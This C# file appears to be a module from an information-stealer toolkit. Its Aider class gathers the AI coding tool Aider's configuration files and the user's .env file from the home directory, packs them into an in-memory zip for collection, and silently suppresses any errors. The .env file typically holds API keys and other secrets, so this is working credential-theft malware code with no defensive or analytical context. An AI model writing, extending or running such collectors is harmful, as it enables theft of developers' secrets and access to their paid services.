using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class Aider : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var entry = new Counter.CounterApplications { Name = "Aider" };
            string[] targetFiles = {
                Path.Combine(userProfile, ".aider.conf.yml"),
                Path.Combine(userProfile, ".aider.model.settings.yml"),
                Path.Combine(userProfile, ".aider.model.metadata.json"),
                Path.Combine(userProfile, ".env")
            };
            foreach (string file in targetFiles)
            {
                if (!File.Exists(file)) continue;
                try
                {
                    string rel = "AI-Agent\\Aider\\" + Path.GetFileName(file);
                    zip.AddFile(rel, File.ReadAllBytes(file));
                    entry.Files.Add(file + " => " + rel);
                }
                catch { }
            }
            if (entry.Files.Count > 0) counter.AI.Add(entry);
        }
    }
}
